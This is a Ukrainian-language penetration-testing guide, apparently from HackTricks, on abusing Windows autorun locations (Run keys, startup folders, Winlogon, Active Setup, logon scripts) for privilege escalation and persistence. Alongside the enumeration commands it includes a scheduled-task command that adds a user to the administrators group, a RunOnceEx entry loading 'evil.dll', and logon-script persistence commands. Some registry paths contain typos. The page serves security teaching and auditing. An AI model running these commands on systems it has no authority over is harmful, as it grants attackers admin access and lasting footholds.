# Підвищення привілеїв за допомогою Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** можна використовувати для запуску програм під час **startup**. Переглянути, які бінарні файли запрограмовані для запуску під час startup, можна за допомогою:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Заплановані завдання

**Завдання** можна запланувати для запуску з **певною періодичністю**. Використовуйте наведені нижче команди, щоб переглянути, які бінарні файли заплановано для запуску:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Папки

Усі бінарні файли, розташовані в **папках Startup, будуть виконані під час запуску**. Поширені папки Startup наведено нижче, але папку Startup вказано в реєстрі. [Прочитайте це, щоб дізнатися де саме.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **До відома**: уразливості *path traversal* під час розпакування архівів (наприклад, та, що використовувалася у WinRAR до версії 7.13 — CVE-2025-8088) можна використати для **розміщення payload безпосередньо в цих Startup folders під час розпакування**, що призведе до виконання коду під час наступного входу користувача в систему. Докладний опис цієї техніки дивіться тут:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Реєстр

> [!TIP]
> [Примітка звідси](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): запис реєстру **Wow6432Node** вказує на те, що ви використовуєте 64-бітну версію Windows. Операційна система використовує цей ключ для відображення окремого представлення HKEY_LOCAL_MACHINE\SOFTWARE для 32-бітних застосунків, які працюють у 64-бітних версіях Windows.

### Runs

**Загальновідомі** AutoRun у реєстрі:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Ключі реєстру, відомі як **Run** і **RunOnce**, призначені для автоматичного виконання програм щоразу, коли користувач входить у систему. Довжина командного рядка, призначеного як значення даних ключа, не може перевищувати 260 символів.<sup>[[2]](#references)</sup>

**Service runs** (можуть керувати автоматичним запуском служб під час завантаження):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

У Windows Vista та новіших версіях ключі реєстру **Run** і **RunOnce** не створюються автоматично. Записи в цих ключах можуть безпосередньо запускати програми або визначати їх як залежності. Наприклад, для завантаження DLL-файлу під час входу в систему можна використати ключ реєстру **RunOnceEx** разом із ключем "Depend". Це демонструється додаванням запису реєстру для виконання "C:\temp\evil.dll" під час запуску системи:<sup>[[2]](#references)</sup>
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Якщо ви можете записувати до будь-якого зі згаданих розділів реєстру в **HKLM**, ви можете підвищити привілеї, коли інший користувач увійде в систему.

> [!TIP]
> **Exploit 2**: Якщо ви можете перезаписати будь-який із зазначених бінарних файлів у будь-якому з розділів реєстру в **HKLM**, ви можете змінити цей бінарний файл, додавши backdoor, коли інший користувач увійде в систему, і підвищити привілеї.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Шлях автозапуску

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Ярлики, розміщені в папці **Startup**, автоматично запускатимуть служби або застосунки під час входу користувача в систему чи перезавантаження системи. Розташування папки **Startup** визначається в реєстрі для областей **Local Machine** і **Current User**. Це означає, що будь-який ярлик, доданий до зазначених розташувань **Startup**, забезпечить запуск пов’язаної служби або програми після входу в систему чи перезавантаження, що робить цей спосіб простим методом планування автоматичного запуску програм.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> Якщо ви можете перезаписати будь-яку папку \[User] Shell Folder у **HKLM**, ви зможете вказати на папку, контрольовану вами, і розмістити там backdoor, який виконуватиметься щоразу, коли користувач входить у систему, підвищуючи привілеї.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Це значення реєстру для окремого користувача може вказувати на скрипт або команду, яка виконується під час входу цього користувача в систему. Воно переважно є примітивом **persistence**, оскільки запускається лише в контексті відповідного користувача, але його все одно варто перевіряти під час post-exploitation і перевірки autoruns.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Якщо ви можете записати це значення для поточного користувача, ви можете повторно ініціювати виконання під час наступного інтерактивного входу без прав адміністратора. Якщо ви можете записати його у вулик реєстру іншого користувача, ви можете отримати виконання коду, коли цей користувач увійде в систему.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Нотатки:

- Надавайте перевагу повним шляхам до `.bat`, `.cmd`, `.ps1` або інших launcher-файлів, які вже доступні цільовому користувачеві.
- Це зберігається після виходу із системи або перезавантаження, доки значення не буде видалено.
- На відміну від `HKLM\...\Run`, це **саме по собі не надає підвищених привілеїв**; це persistence у межах користувача.

### Ключі Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Зазвичай ключ **Userinit** має значення **userinit.exe**. Однак якщо цей ключ змінити, вказаний executable також буде запущено **Winlogon** під час входу користувача в систему. Аналогічно, ключ **Shell** призначений для вказування на **explorer.exe**, який є оболонкою Windows за замовчуванням.<sup>[[1]](#references)</sup>
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Якщо ви можете перезаписати значення реєстру або бінарний файл, ви зможете підвищити привілеї.

### Налаштування політики

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Перевірте ключ **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Зміна командного рядка безпечного режиму

У реєстрі Windows у розділі `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` є значення **`AlternateShell`**, якому за замовчуванням задано `cmd.exe`. Це означає, що коли під час запуску ви вибираєте «Безпечний режим із командним рядком» (натиснувши F8), використовується `cmd.exe`. Однак можна налаштувати комп’ютер на автоматичний запуск у цьому режимі без натискання F8 і ручного вибору.

Кроки для створення параметра завантаження, який автоматично запускає «Безпечний режим із командним рядком»:<sup>[[5]](#references)</sup>

1. Змініть атрибути файлу `boot.ini`, щоб видалити прапорці лише для читання, системний і прихований: `attrib c:\boot.ini -r -s -h`
2. Відкрийте `boot.ini` для редагування.
3. Додайте рядок на кшталт: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Збережіть зміни до `boot.ini`.
5. Відновіть початкові атрибути файлу: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Зміна ключа реєстру **AlternateShell** дає змогу налаштувати власну командну оболонку, потенційно для несанкціонованого доступу.
- **Exploit 2 (PATH Write Permissions):** Наявність дозволів на запис до будь-якої частини системної змінної **PATH**, особливо перед `C:\Windows\system32`, дає змогу виконати власний `cmd.exe`, який може бути backdoor, якщо систему запущено в Safe Mode.
- **Exploit 3 (PATH and boot.ini Write Permissions):** Доступ на запис до `boot.ini` дає змогу автоматично запускати Safe Mode, сприяючи несанкціонованому доступу під час наступного перезавантаження.

Щоб перевірити поточне значення **AlternateShell**, використайте такі команди:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Встановлений компонент

Active Setup — це функція Windows, яка **ініціюється до повного завантаження середовища робочого столу**. Вона надає пріоритет виконанню певних команд, які мають завершитися до продовження входу користувача в систему. Цей процес відбувається навіть до запуску інших записів автозапуску, наприклад у розділах реєстру Run або RunOnce.

Active Setup керується за допомогою таких ключів реєстру:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

У цих ключах містяться різні підрозділи, кожен із яких відповідає певному компоненту. Особливий інтерес становлять такі значення ключів:

- **IsInstalled:**
- `0` означає, що команда компонента не виконуватиметься.
- `1` означає, що команда виконуватиметься один раз для кожного користувача; це поведінка за замовчуванням, якщо значення `IsInstalled` відсутнє.
- **StubPath:** Визначає команду, яку виконуватиме Active Setup. Це може бути будь-який коректний командний рядок, наприклад запуск `notepad`.

**Відомості щодо безпеки:**

- Зміна або запис ключа, у якому **`IsInstalled`** має значення `"1"` із певним **`StubPath`**, може призвести до несанкціонованого виконання команд і потенційно використовуватися для privilege escalation.
- Зміна бінарного файлу, на який посилається будь-яке значення **`StubPath`**, також може призвести до privilege escalation за наявності достатніх дозволів.

Для перевірки конфігурацій **`StubPath`** у компонентах Active Setup можна використовувати такі команди:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Огляд Browser Helper Objects (BHO)

Browser Helper Objects (BHO) — це DLL-модулі, які додають додаткові функції до Microsoft Internet Explorer. Вони завантажуються в Internet Explorer і Windows Explorer під час кожного запуску. Водночас їх виконання можна заблокувати, встановивши значення ключа **NoExplorer** у 1, що не дозволить їм завантажуватися разом із екземплярами Windows Explorer.<sup>[[1]](#references)</sup>

BHO сумісні з Windows 10 через Internet Explorer 11, але не підтримуються в Microsoft Edge — браузері за замовчуванням у новіших версіях Windows.

Щоб переглянути зареєстровані в системі BHO, можна перевірити такі ключі реєстру:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Кожен BHO представлений у реєстрі своїм **CLSID**, який слугує унікальним ідентифікатором. Детальну інформацію про кожен CLSID можна знайти в розділі `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Для пошуку BHO у реєстрі можна використовувати такі команди:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Розширення Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Зверніть увагу, що реєстр міститиме 1 новий запис реєстру для кожної dll, і він буде представлений через **CLSID**. Інформацію про CLSID можна знайти в `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Драйвери шрифтів

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Відкрити команду

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Зверніть увагу, що всі місця, де можна знайти autoruns, **вже перевіряються за допомогою**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Однак для отримання **повнішого списку файлів, що запускаються автоматично**, можна використати [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)від systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Більше

**Знайдіть більше Autoruns, як-от записи реєстру, у** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## References

- [1] [Поширені механізми persistence malware](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Boot or Logon Initialization Scripts: Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Категорії автозапуску (Troubleshooting with the Windows Sysinternals Tools, 2nd Edition)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [Як додати параметр завантаження, який запускає альтернативну оболонку?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit – підсумки за 04.03.2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)
{{#include ../../banners/hacktricks-training.md}}
